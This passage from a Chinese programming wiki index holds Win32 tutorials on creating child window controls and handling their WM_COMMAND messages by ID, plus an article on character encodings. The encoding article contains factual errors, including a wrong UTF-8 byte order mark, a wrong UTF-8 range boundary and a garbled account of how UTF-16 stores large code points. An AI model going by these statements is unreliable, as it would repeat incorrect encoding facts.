在UI线程中避免执行阻塞操作以保持界面响应，复杂逻辑的操作放在单独的工作线程中执行。"},{"title":"子窗口","path":"/wiki/Windows_API/子窗口.html","content":"前言 第一个窗口程序那一小节我们通过创建WNDCLASS类的对象，填充字段，注册窗口类，CreateWindow创建出窗口，最后ShowWindow显示窗口。 12345678910111213141516171819202122232425// 1. 定义要创建的窗口是什么样的WNDCLASS wndClass = &#123; 0 &#125;; // 创建WNDCLASS窗口类对象，初始化填充为0wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // 窗口背景颜色TCHAR className[] = TEXT(&quot;My First Window&quot;);wndClass.lpszClassName = className; // 窗口类名wndClass.hInstance = hInstance; // 窗口实例句柄，窗口属于哪个进程，当前进程就是WinMain函数参数hInstancewndClass.lpfnWndProc = WindowProc; // 窗口过程函数// 2. 创建并显示窗口RegisterClass(&amp;wndClass); // 注册窗口类HWND hWnd = CreateWindow(className, // 窗口类名 TEXT(&quot;窗口&quot;), // 窗口标题 WS_OVERLAPPEDWINDOW, // 窗口样式 10, 10, // 窗口位置 相对于父窗口的x坐标和y坐标是什么 600, 300, // 窗口大小 NULL, NULL, // 父窗口句柄和菜单句柄 这个窗口没有父窗口，写空；不需要菜单，写空 hInstance, // 实例句柄 NULL); // 附加参数 没，填空//...//检查CreateWindow是否执行成功的代码略//...ShowWindow(hWnd, SW_SHOW); // 显示窗口 创建一个窗口的流程就是如上面这样。如果想自己画一个窗口，步骤就是上面这一套。但对于常用的一些窗口，Windows已经预先定义好了这些窗口的类（比如按钮，复选框，编辑框，静态字符串标签和滚动条等）方便开发者使用，一般称它们为子窗口控件，简称控件。控件会自己处理消息，在自己状态发生改变时通知父窗口，换句话说，我们直接使用这些预定义好的子窗口，不需要给它们定义回调函数，而在父窗口的回调函数中就能处理到这些子窗口的消息。 下一小节会详细展开讲下，子窗口消息如何到父窗口回调函数的，这里先粗略理解为这样。 本小节就是演示如何使用子窗口控件，如何处理子窗口的消息，重点在于遇到问题时如何思考如何查文档，以及在实验过程中体会windows窗口的消息机制。另外，由于子窗口控件不美观，在实际开发过程中并不使用，后续需要学习MFC，MFC的窗口更美观且开发更高效。 创建子窗口 在哪里添加创建子窗口的代码呢？有一种方法是在CreateWindow主窗口代码后边再使用CreateWindow创建子窗口，后续步骤和主窗口一样。但实际上还有一种办法，就是在主窗口窗口过程函数的WM_CREATE消息中使用CreateWindow创建子窗口。父窗口一创建，产生WM_CREATE消息，就会创建子窗口。 下一小节演示在CreateWindow主窗口代码后边使用CreateWindow创建子窗口 创建编辑框12345678910111213141516171819// 当窗口创建时，创建子窗口控件case WM_CREATE:&#123; // 创建编辑框 CreateWindow( TEXT(&quot;EDIT&quot;), // lpClassName: 窗口类名，这里是预定义的编辑框类 TEXT(&quot;&quot;), // lpWindowName: 窗口标题，这里为空字符串，因为编辑框通常不需要标题 WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE, // dwStyle: 窗口样式，这里包括子窗口、可见、垂直滚动条和多行编辑框 0, // x: 窗口的水平位置，相对于父窗口 0, // y: 窗口的垂直位置，相对于父窗口 400, // nWidth: 窗口的宽度 300, // nHeight: 窗口的高度 hwnd, // hWndParent: 父窗口句柄，这里是WM_CREATE消息中接收到的窗口句柄 NULL, // hMenu: 菜单句柄或子窗口ID，这里先为NULL，后面会提 g_Hinstance, // hInstance: 窗口实例句柄 NULL // lpParam: 指向创建窗口时传递的值的指针，这里为NULL ); break;&#125; dwStyle参数填这个窗口的风格，包括窗口通用风格和特有风格 窗口通用风格：CreateWindow的MSDN上是一些通用窗口的风格Window Styles 子窗口必填WS_CHILD（表示是子窗口），WS_VISIBLE（表示可见） 特有风格 比如MSDN上搜Edit Style查EDIT编辑框特有的风格。ES_MULTILINE表这个文本框可多行编辑 hInstance填句柄，表示该窗口所属进程。 子窗口所属是当前程序，填WinMain参数hInstance，但hInstance只在WinMain函数中可见，在WindowProc函数中不可见，所以前面要用个全局变量来存下WinMain参数hInstance。 1234567891011HINSTANCE g_hInstance;int APIENTRY WinMain(HINSTANCE hInstance, // 当前程序实例的句柄 HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) &#123; g_hInstance = hInstance; //其余代码略&#125; 创建按钮1234567891011121314151617181920212223242526272829// 创建&quot;设置&quot;按钮CreateWindow( TEXT(&quot;BUTTON&quot;), // lpClassName: 窗口类名，这里是预定义的按钮类 TEXT(&quot;设置&quot;), // lpWindowName: 按钮上的文字 WS_CHILD | WS_VISIBLE, // dwStyle: 窗口样式，这里包括子窗口和可见 450, // x: 水平位置 150, // y: 垂直位置 80, // nWidth: 宽度 20, // nHeight: 高度 hwnd, // hWndParent: 父窗口句柄 NULL, // hMenu: 菜单句柄或子窗口ID，这里先为NULL，后面会提 g_Hinstance, // hInstance: 实例句柄 NULL // lpParam: 创建窗口时传递的值，这里为NULL);// 创建&quot;获取&quot;按钮CreateWindow( TEXT(&quot;BUTTON&quot;), // lpClassName: 窗口类名，同样是按钮类 TEXT(&quot;获取&quot;), // lpWindowName: 按钮上的文字 WS_CHILD | WS_VISIBLE, // dwStyle: 窗口样式 450, // x: 水平位置 100, // y: 垂直位置 80, // nWidth: 宽度 20, // nHeight: 高度 hwnd, // hWndParent: 父窗口句柄 NULL, // hMenu: 菜单句柄或子窗口ID，这里先为NULL，后面会提 g_Hinstance, // hInstance: 实例句柄 NULL // lpParam: 创建窗口时传递的值); 运行后看到子窗口被创建出来了，用户点击“获取”或“设置”按钮时子窗口是知道的。 处理子窗口消息 子窗口控件自己会处理消息，将消息发到父窗口中，也就是说我们可以在父窗口的回调函数中处理这些子窗口的消息。假设当“获取”按钮按下时，我们要做一些事。那么，怎么知道当“获取”按钮按下时触发的是什么消息？ 和之前一样，将消息打印出来。 123456789101112131415LRESULT CALLBACK WindowProc(HWND hwnd, // 窗口句柄 UINT uMsg, // 消息标识 WPARAM wParam, // 附加消息信息 LPARAM lParam) // 附加消息信息&#123; char szOutBuff[0x80]; sprintf(szOutBuff, &quot;Message: %x - %x &quot;, hwnd, uMsg); OutputDebugString(szOutBuff); switch (uMsg) &#123; //switch语句内容略 &#125; return DefWindowProc(hwnd, uMsg, wParam, lParam); // 默认窗口处理函数&#125; 运行，按下“获取”按钮，查看消息的值，发现是111 然后随便找个WM_CREATE进到定义的头文件中去搜111，找到111这个值对应的宏，发现是WM_COMMAND，然后去MSDN搜WM_COMMAND看这个消息相关的说明 1#define WM_COMMAND 0x0111 问题来了，点击“设置”按钮和“获取”按钮产生的消息都是WM_COMMAND，如何区别是点了“设置”按钮还是“获取”按钮？ 菜单ID CreateWindow里有个hMenu参数，创建子窗口时可以给这个窗口指定ID。产生WM_COMMAND时，wParam参数的低word字节表示的是菜单ID（Menu identifier）。 在代码前面定义菜单ID，创建子窗口时hMenu参数填这个参数。 1234// 定义子窗口标识#define IDC_EDIT_1 0x100#define IDC_BUTTON_1 0x101#define IDC_BUTTON_2 0x102 1234567891011121314151617181920212223242526272829303132333435363738394041424344// 创建编辑框CreateWindow( TEXT(&quot;EDIT&quot;), TEXT(&quot;&quot;), WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE, 0, 0, 400, 300, hwnd, (HMENU)IDC_EDIT_1, // hMenu: 子窗口ID，强转为HMENU类型 g_hInstance, NULL );// 创建&quot;设置&quot;按钮CreateWindow( TEXT(&quot;BUTTON&quot;), TEXT(&quot;设置&quot;), WS_CHILD | WS_VISIBLE, 450, 150, 80, 20, hwnd, (HMENU)IDC_BUTTON_1, // hMenu: 子窗口ID，强转为HMENU类型 g_hInstance, NULL );// 创建&quot;获取&quot;按钮CreateWindow( TEXT(&quot;BUTTON&quot;), TEXT(&quot;获取&quot;), WS_CHILD | WS_VISIBLE, 450, 100, 80, 20, hwnd, (HMENU)IDC_BUTTON_2, // hMenu: 子窗口ID，强转为HMENU类型 g_hInstance, NULL ); WM_COMMAND消息中用LWORD宏取wParam参数低16字节，通过菜单ID来判断是哪个按钮被点击。 1234567891011121314151617181920212223242526// 当按钮被点击case WM_COMMAND:&#123; // 消息为WM_COMMAND时，wParam参数的低16位中为菜单ID //使用LOWORD宏获获取wParam参数低16位 switch (LOWORD(wParam)) &#123; // 当按钮为设置 case IDC_BUTTON_1: &#123; // SetDlgItemText函数修改编辑框内容 SetDlgItemText(hwnd, (int)IDC_EDIT_1, TEXT(&quot;测试&quot;)); break; &#125; // 当按钮为获取 case IDC_BUTTON_2: &#123; TCHAR szEditBuffer[0x80]; GetDlgItemText(hwnd, (int)IDC_EDIT_1, szEditBuffer, 0x80); //获取编辑框中内容 MessageBox(NULL, szEditBuffer, NULL, NULL); break; &#125; &#125; break;&#125; SetDlgItemText：设置文本框里的文本内容 GetDlgItemText：获取文本框里的文本内容到缓冲区中 程序完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#pragma warning(disable : 4996)LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);HINSTANCE g_hInstance;// 定义子窗口标识#define IDC_EDIT_1 0x100#define IDC_BUTTON_1 0x101#define IDC_BUTTON_2 0x102int APIENTRY WinMain(HINSTANCE hInstance, // 当前程序实例的句柄 HINSTANCE hPrevInstance, // 前一个实例的句柄，不再使用 LPSTR lpCmdLine, // 命令行参数 int nCmdShow) // 控制窗口显示方式的标志&#123; g_hInstance = hInstance; // 1. 定义要创建的窗口是什么样的 WNDCLASS wndClass = &#123; 0 &#125;; // 创建WNDCLASS窗口类对象，初始化填充为0 wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // 窗口背景颜色 TCHAR className[] = TEXT(&quot;My First Window&quot;); wndClass.lpszClassName = className; // 窗口类名 wndClass.hInstance = hInstance; // 窗口实例句柄，窗口属于哪个进程，当前进程就是WinMain函数参数hInstance wndClass.lpfnWndProc = WindowProc; // 窗口过程函数 // 2. 创建并显示窗口 RegisterClass(&amp;wndClass); // 注册窗口类 HWND hWnd = CreateWindow(className, // 窗口类名 TEXT(&quot;窗口&quot;), // 窗口标题 WS_OVERLAPPEDWINDOW, // 窗口样式 10, 10, // 窗口位置 相对于父窗口的x坐标和y坐标是什么 600, 300, // 窗口大小 NULL, NULL, // 父窗口句柄和菜单句柄 这个窗口没有父窗口，写空；不需要菜单，写空 hInstance, // 实例句柄 NULL); // 附加参数 没，填空 char szOutBuff[0x80]; if (hWnd == NULL) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; ShowWindow(hWnd, SW_SHOW); // 显示窗口 // 3. 接收消息并处理 MSG msg; BOOL bRet; while ((bRet = GetMessage(&amp;msg, NULL, 0, 0) ) != 0) // 消息循环 &#123; if (bRet == -1) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; else &#123; //TranslateMessage(&amp;msg); // 翻译消息 DispatchMessage(&amp;msg); // 分发消息 &#125; &#125; return 0;&#125;LRESULT CALLBACK WindowProc(HWND hwnd, // 窗口句柄 UINT uMsg, // 消息标识 WPARAM wParam, // 附加消息信息 LPARAM lParam) // 附加消息信息&#123; switch (uMsg) &#123; // 当窗口创建时，创建子窗口控件 case WM_CREATE: &#123; // 创建编辑框 CreateWindow( TEXT(&quot;EDIT&quot;), // lpClassName: 窗口类名，这里是预定义的编辑框类 TEXT(&quot;&quot;), // lpWindowName: 窗口标题，这里为空字符串，因为编辑框通常不需要标题 WS_CHILD | WS_VISIBLE | WS_VSCROLL | ES_MULTILINE, // dwStyle: 窗口样式，这里包括子窗口、可见、垂直滚动条和多行编辑框 0, // x: 窗口的水平位置，相对于父窗口 0, // y: 窗口的垂直位置，相对于父窗口 400, // nWidth: 窗口的宽度 300, // nHeight: 窗口的高度 hwnd, // hWndParent: 父窗口句柄，这里是WM_CREATE消息中接收到的窗口句柄 (HMENU)IDC_EDIT_1, // hMenu: 子窗口ID，强转为HMENU类型 g_hInstance, // hInstance: 窗口实例句柄 NULL // lpParam: 指向创建窗口时传递的值的指针，这里为NULL ); // 创建&quot;设置&quot;按钮 CreateWindow( TEXT(&quot;BUTTON&quot;), // lpClassName: 窗口类名，这里是预定义的按钮类 TEXT(&quot;设置&quot;), // lpWindowName: 按钮上的文字 WS_CHILD | WS_VISIBLE, // dwStyle: 窗口样式，这里包括子窗口和可见 450, // x: 水平位置 150, // y: 垂直位置 80, // nWidth: 宽度 20, // nHeight: 高度 hwnd, // hWndParent: 父窗口句柄 (HMENU)IDC_BUTTON_1, // hMenu: 子窗口ID，强转为HMENU类型 g_hInstance, // hInstance: 实例句柄 NULL // lpParam: 创建窗口时传递的值，这里为NULL ); // 创建&quot;获取&quot;按钮 CreateWindow( TEXT(&quot;BUTTON&quot;), // lpClassName: 窗口类名，同样是按钮类 TEXT(&quot;获取&quot;), // lpWindowName: 按钮上的文字 WS_CHILD | WS_VISIBLE, // dwStyle: 窗口样式 450, // x: 水平位置 100, // y: 垂直位置 80, // nWidth: 宽度 20, // nHeight: 高度 hwnd, // hWndParent: 父窗口句柄 (HMENU)IDC_BUTTON_2, // hMenu: 子窗口ID，强转为HMENU类型 g_hInstance, // hInstance: 实例句柄 NULL // lpParam: 创建窗口时传递的值 ); break; &#125; // 当按钮被点击 case WM_COMMAND: &#123; // 消息为WM_COMMAND时，wParam参数的低16位中为菜单ID //使用LOWORD宏获获取wParam参数低16位 switch (LOWORD(wParam)) &#123; // 当按钮为设置 case IDC_BUTTON_1: &#123; // SetDlgItemText函数修改编辑框内容 SetDlgItemText(hwnd, (int)IDC_EDIT_1, TEXT(&quot;测试&quot;)); break; &#125; // 当按钮为获取 case IDC_BUTTON_2: &#123; TCHAR szEditBuffer[0x80]; GetDlgItemText(hwnd, (int)IDC_EDIT_1, szEditBuffer, 0x80); //获取编辑框中内容 MessageBox(NULL, szEditBuffer, NULL, NULL); break; &#125; &#125; break; &#125; &#125; return DefWindowProc(hwnd, uMsg, wParam, lParam); // 默认窗口处理函数&#125; 小结 学习Windows图形编程是为了体会消息机制，便于后续学习MFC（对win32进行封装） 子窗口控件是windows预先定义好的一些窗口，可以直接拿来使用。子窗口知道自己的状态发生改变，开发者创建好子窗口后，在父窗口的回调函数中处理子窗口的产生的消息 子窗口控件通过菜单ID（Menu ID）进行区分 tips：不知道对窗口某个操作所产生的消息是什么，可以在回调函数中打印出来，然后取查文档 123char szOutBuff[0x80];sprintf(szOutBuff, &quot;Message: %x - %x &quot;, hwnd, uMsg);OutputDebugString(szOutBuff);"},{"title":"字符编码","path":"/wiki/Windows_API/字符编码.html","content":"字符的本质是查表，字符和数值之间的映射。 wiki-C语言-字符和字符串文章里写过一些，所以本文前面有些内容就简略写写了。 ASCII表 American Standard Code for Information Interchange美国标准信息交换代码 标准ASCII表用的7位二进制数来表示所有的大写和小写字母，数字 0 到 9、标点符号，以及在美式英语中使用的特殊控制字符，共128个字符。 扩展ASCII表(Extended ASCII) 早期小型计算机发展时，能将最高位也利用起来，8位字节的标准得以巩固。扩充字符的编码均为高位为1的8位代码（即十进制数128一255 )，称为扩展ASClI码。扩展ASCII码所增加的字符包括加框文字、圆圈和其他图形符号。 标准ASCII表最高位为0，扩展ASCII表补充的128个字符最高位为1。 GB2312或GB2312-80 如果是使用象形文字的国家，像中文，即使8位全用上，也只能表示256个字符。并且最高位扩充的这些字符（即十进制数128一255)，在天朝几乎用不上，于是对最高位扩充的这些字符重新进行编码，并用两个字节来表示一个汉字，即小于127的字符意义与原来相同，当两个大于127的字符连在一起时，就表示一个汉字。用区和位来定位，这就是GB2312或GB2312-80，也叫汉字国标码。 Unicode 为了解决GB2312或GB2312-80的弊端，Unicode诞生了，拿一张大表，将世界上所有书面语言常用的字符和象形文字都编进来。Unicode的编码范围是：0-0x10FFFF，可以容纳100多万个符号。 Unicode这张表是唯一的，所以不会出现乱码的问题（导致乱码的原因是多个字符对应同一个二进制数。）。 ⚠️注意：Unicode只是一种编码方案（符号背后对应的二进制数），并没有说明这个二进制数应该如何存储。 UTF-16和UTF-8是Unicode的存储实现方式，说明了这些二进制数该怎么存到计算机上。 UTF-16 UTF-16编码是以16个无符号整数（2个字节）为1个基本单位，封顶2个单位，即4个字节。如： 某个字符用Unicode编码表示是8位，用utf-16存需要对齐，再补上1个字节，最终是用2个字节来表示 某个字符用Unicode编码表示是3个字节，用utf-16存需要对齐，再补上1个字节，最终是用4个字节来表示 现在机器上的Unicode编码一般指的就是UTF-16，所以大家习惯地将Unicode和UTF-16混为一谈了。如果问“Unicode字符是用多少个字节来表示”，因为不知道存储方案，这个问题是无法回答的 比如字符’A’，Unicode编码是0x41h，要补齐到2个字节，于是存储的是：0x00 0x41h 比如汉字’中’，Unicode编码是0x4E 0x2D，已经是两个字符了，于是存储的是：0x4E 0x2D 比如某个符号’逆’（假设的，懒得找了），Unicode编码是0x4E 0x2D 0x7A，三个字符，要补齐，于是最终存储的是：0x00 0x4E 0x2D 0x7A 最多是4个字节表示，因为4个字节已经能表示完世界上常用的字符了 UTF-16LE（小端存储）UTF-16BE（大端存储） UTF-16的优点：计算、拆分、解析非常方便，2个字节为一个单位，一个一个来。 UTF-16的缺点：UTF-16会存在浪费空间的情况。 因为UTF-16是两个字节为一个基本单位，许多常见字符实际上只需要一个字节。比如字符’A’，Unicode编码是0x41h，只需要1个字节就能表示。但使用UTF-16需要补齐到2个字节。在本地存储是无所谓的，就是浪费点硬盘空间。但如果是网络传输，会导致更大的传输开销。而UTF-8提供了一种变长的存储方案，可以解决utf-16导致的存储和传输开销。 UTF-8 UTF-8（8-bit Unicode Transformation Format）是一种可变长度的存储方案，它的存储方案是根据字符的编码来决定用多个个字节（1~4）来存储，规则如下： Unicode编码（16进制） UTF-8 字节流（二进制） 0x000000-0x00007F 0XXXXXXX 0x000080-0x0007FF 110XXXXX 10XXXXXX 0x000800-0x000FFF 1110XXXX 10XXXXXX 10XXXXXX 0x010000-0x10FFFF 11110XXX 10XXXXXX 10XXXXXX 10XXXXXX 表格里的X表示占位符 每组前面那个是特定的标记位：11110（对于第一组），10（对于其余的组） 比如字符’A’，Unicode编码是0x41h，在0x000000 - 0x00007F范围之间，采用0XXXXXX的方式进行存储，写成十六进制还是0x41h，和原来一样。 比如汉字’中’，Unicode编码是0x4E 0x2D，在0x000800 - 0x00FFFF范围之间，按1110XXXX 10XXXXXX 10XXXXXX来存，转换过程如下： 1234560x4E 0x2D //&#x27;中&#x27;的Unicode编码，十六进制表示0100 1110 0010 1101 //拆成二进制1110XXXX 10XXXXXX 10XXXXXX //utf-8存储方案，X是占位符，数字10那些是标记位，是固定的1110(0100) 10(111000) 10(101101) //将第二行的二进制写入到X中，()起来表示的是填进去的E4 B8 AD //用十六进制表示 UTF-8不分大小端，因为是变长的UTF-8编码存储文本时不区分大端（Big Endian）和小端（Little Endian）。这是因为UTF-8编码的特殊性质决定的：字节顺序无关性： 在UTF-8中，每个字符可能由一个到四个字节组成。每个字节是独立的，并且其顺序在定义字符时是固定的。这意味着无论在什么类型的系统中（无论是大端还是小端），UTF-8编码的文本都是相同的。自同步性质： UTF-8的设计使得在任何字节序列中，从任何点开始都能准确地确定任何字符的开始和结束。每个字节的高位用于标识它是一个单独的字符、多字节序列的开始字节，还是多字节序列中的后续字节。由于这些特性，UTF-8编码的文本不需要像UTF-16或UTF-32那样指定字节序。在UTF-16和UTF-32中，相同的字符可以有两种不同的表示方式（大端和小端），因此需要明确字节序。例如，使用BOM（字节顺序标记）来指示编码使用的是大端还是小端格式。简而言之，UTF-8的设计天生就是字节顺序无关的，因此没有大端或小端之分。 BOM（Byte Order Mark） 位于文本文件起始位置开头，用于标识该Unicode文件的编码类型 UTF-8 EF EB BF UTF-16LE（小端存储） FF FE UTF-16BE（大端存储） FE FF 例，文本内容都是A中 如果记事本中另存为时右下角的编码没有UTF-16，有Unicode那一项，那就是表示ytf-16。因为一般来说Unicode编码使用utf-16来实现，所以说Unicode大家默认认为是utf-16，实际上utf-16只是Unicode的一种存储方式 UTF-8UTF-16LE（小端存储）UTF-16BE（大端存储）记事本另存为选择带有BOM的UTF-8 记事本另存为选择UTF-16LE 记事本另存为选择UTF-16BE"},{"title":"子窗口消息处理逻辑及逆向分析","path":"/wiki/Windows_API/子窗口消息处理逻辑及逆向分析.html","content":"按钮是什么 这次我们通过在CreateWindow创建主窗口后用CreateWindow创建按钮的方式来来创建子窗口 CreateWindow创建按钮时有个参数要填父窗口的句柄，所以CreateWindow子窗口的代码要放在父窗口hwnd被创建出来的后面 代码完整代码diff123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#pragma warning(disable : 4996)LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);void CreateButton(HWND hwnd);HINSTANCE g_hInstance;int APIENTRY WinMain(HINSTANCE hInstance, // 当前程序实例的句柄 HINSTANCE hPrevInstance, // 前一个实例的句柄，不再使用 LPSTR lpCmdLine, // 命令行参数 int nCmdShow) // 控制窗口显示方式的标志&#123; g_hInstance = hInstance; // 1. 定义要创建的窗口是什么样的 WNDCLASS wndClass = &#123; 0 &#125;; // 创建WNDCLASS窗口类对象，初始化填充为0 wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // 窗口背景颜色 TCHAR className[] = TEXT(&quot;My First Window&quot;); wndClass.lpszClassName = className; // 窗口类名 wndClass.hInstance = hInstance; // 窗口实例句柄，窗口属于哪个进程，当前进程就是WinMain函数参数hInstance wndClass.lpfnWndProc = WindowProc; // 窗口过程函数 // 2. 创建并显示窗口 RegisterClass(&amp;wndClass); // 注册窗口类 HWND hWnd = CreateWindow(className, // 窗口类名 TEXT(&quot;窗口&quot;), // 窗口标题 WS_OVERLAPPEDWINDOW, // 窗口样式 10, 10, // 窗口位置 相对于父窗口的x坐标和y坐标是什么 600, 300, // 窗口大小 NULL, NULL, // 父窗口句柄和菜单句柄 这个窗口没有父窗口，写空；不需要菜单，写空 hInstance, // 实例句柄 NULL); // 附加参数 没，填空 char szOutBuff[0x80]; if (hWnd == NULL) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; CreateButton(hWnd); ShowWindow(hWnd, SW_SHOW); // 显示窗口 // 3. 接收消息并处理 MSG msg; BOOL bRet; while ((bRet = GetMessage(&amp;msg, NULL, 0, 0) ) != 0) // 消息循环 &#123; if (bRet == -1) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; else &#123; TranslateMessage(&amp;msg); // 翻译消息 DispatchMessage(&amp;msg); // 分发消息 &#125; &#125; return 0;&#125;LRESULT CALLBACK WindowProc(HWND hwnd, // 窗口句柄 UINT uMsg, // 消息标识 WPARAM wParam, // 附加消息信息 LPARAM lParam) // 附加消息信息&#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); // 默认窗口处理函数&#125;void CreateButton(HWND hwnd)&#123; HWND hwndPushButton = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;普通按钮&quot;), //WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, 10, 10, 80, 20, hwnd, (HMENU)1001, //子窗口ID g_hInstance, NULL); HWND hwndCheckBox = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;复选框&quot;), //WS_CHILD | WS_VISIBLE | BS_CHECKBOX | BS_AUTOCHECKBOX, WS_CHILD | WS_VISIBLE | BS_CHECKBOX | BS_AUTOCHECKBOX, 10, 40, 80, 20, hwnd, (HMENU)1002, //子窗口ID g_hInstance, NULL); HWND hwndRadio = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;单选按钮&quot;), //WS_CHILD | WS_VISIBLE | BS_RADIOBUTTON | BS_AUTORADIOBUTTON, WS_CHILD | WS_VISIBLE | BS_RADIOBUTTON, 10, 70, 80, 20, hwnd, (HMENU)1003, //子窗口ID g_hInstance, NULL);&#125;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#pragma warning(disable : 4996)LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);+ void CreateButton(HWND hwnd);+ HINSTANCE g_hInstance;int APIENTRY WinMain(HINSTANCE hInstance, // 当前程序实例的句柄 HINSTANCE hPrevInstance, // 前一个实例的句柄，不再使用 LPSTR lpCmdLine, // 命令行参数 int nCmdShow) // 控制窗口显示方式的标志&#123; g_hInstance = hInstance; // 1. 定义要创建的窗口是什么样的 WNDCLASS wndClass = &#123; 0 &#125;; // 创建WNDCLASS窗口类对象，初始化填充为0 wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // 窗口背景颜色 TCHAR className[] = TEXT(&quot;My First Window&quot;); wndClass.lpszClassName = className; // 窗口类名 wndClass.hInstance = hInstance; // 窗口实例句柄，窗口属于哪个进程，当前进程就是WinMain函数参数hInstance wndClass.lpfnWndProc = WindowProc; // 窗口过程函数 // 2. 创建并显示窗口 RegisterClass(&amp;wndClass); // 注册窗口类 HWND hWnd = CreateWindow(className, // 窗口类名 TEXT(&quot;窗口&quot;), // 窗口标题 WS_OVERLAPPEDWINDOW, // 窗口样式 10, 10, // 窗口位置 相对于父窗口的x坐标和y坐标是什么 600, 300, // 窗口大小 NULL, NULL, // 父窗口句柄和菜单句柄 这个窗口没有父窗口，写空；不需要菜单，写空 hInstance, // 实例句柄 NULL); // 附加参数 没，填空 char szOutBuff[0x80]; if (hWnd == NULL) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125;+ CreateButton(hWnd); ShowWindow(hWnd, SW_SHOW); // 显示窗口 // 3. 接收消息并处理 MSG msg; BOOL bRet; while ((bRet = GetMessage(&amp;msg, NULL, 0, 0) ) != 0) // 消息循环 &#123; if (bRet == -1) &#123; sprintf(szOutBuff, &quot;Error: %d&quot;, GetLastError()); OutputDebugString(szOutBuff); return 0; &#125; else &#123; TranslateMessage(&amp;msg); // 翻译消息 DispatchMessage(&amp;msg); // 分发消息 &#125; &#125; return 0;&#125;LRESULT CALLBACK WindowProc(HWND hwnd, // 窗口句柄 UINT uMsg, // 消息标识 WPARAM wParam, // 附加消息信息 LPARAM lParam) // 附加消息信息&#123; return DefWindowProc(hwnd, uMsg, wParam, lParam); // 默认窗口处理函数&#125;+void CreateButton(HWND hwnd)+&#123;+ HWND hwndPushButton = CreateWindow(+ TEXT(&quot;button&quot;),+ TEXT(&quot;普通按钮&quot;),+ //WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, + WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON,+ 10, 10,+ 80, 20,+ hwnd,+ (HMENU)1001, //子窗口ID + g_hInstance,+ NULL);++ HWND hwndCheckBox = CreateWindow(+ TEXT(&quot;button&quot;),+ TEXT(&quot;复选框&quot;),+ //WS_CHILD | WS_VISIBLE | BS_CHECKBOX | BS_AUTOCHECKBOX, + WS_CHILD | WS_VISIBLE | BS_CHECKBOX | BS_AUTOCHECKBOX,+ 10, 40,+ 80, 20,+ hwnd,+ (HMENU)1002, //子窗口ID + g_hInstance,+ NULL);++ HWND hwndRadio = CreateWindow(+ TEXT(&quot;button&quot;),+ TEXT(&quot;单选按钮&quot;),+ //WS_CHILD | WS_VISIBLE | BS_RADIOBUTTON | BS_AUTORADIOBUTTON, + WS_CHILD | WS_VISIBLE | BS_RADIOBUTTON,+ 10, 70,+ 80, 20,+ hwnd,+ (HMENU)1003, //子窗口ID + g_hInstance,+ NULL);+&#125; 1234567891011HWND hwndPushButton = CreateWindow( TEXT(&quot;button&quot;), TEXT(&quot;普通按钮&quot;), //WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | BS_DEFPUSHBUTTON, 10, 10, 80, 20, hwnd, (HMENU)1001, //子窗口ID g_hInstance, NULL); windows事先定义好的窗口类 通过第一个窗口程序那一小节的代码我们知道，CreateWindows第一个参数传的是自己写的窗口类名，而这里用是windows事先定义好的窗口类，这个TEXT(&quot;button&quot;)表示用windows事先创建好的按钮类窗口 hMenu参数 在CreateWindow父窗口那，表示的是菜单句柄的含义，父窗口那不需要菜单就填NULL。而在子窗口这表示这个子窗口的ID，相当于子窗口的编号 可以体会到：在windows中所有的组件终归都是窗口 子窗口消息的处理 自己定义窗口类的话，在CreateWindow前，需要创建WNDCLASS类的对象，填充字段，而上面我们在CreateWindow直接用系统事先预定义好的按钮类窗口，这些字段不用自己填充了，也就是说，我们并没有给子窗口说回调函数是哪个。这样的话，子窗口的消息怎么处理？如果我们想看windows预先定义好的WNDCLASS结构体里字段的值，我们怎么看？ 12345678910111213141516171819202122232425// 1. 定义要创建的窗口是什么样的WNDCLASS wndClass = &#123; 0 &#125;; // 创建WNDCLASS窗口类对象，初始化填充为0wndClass.hbrBackground = (HBRUSH)COLOR_BACKGROUND; // 窗口背景颜色TCHAR className[] = TEXT(&quot;My First 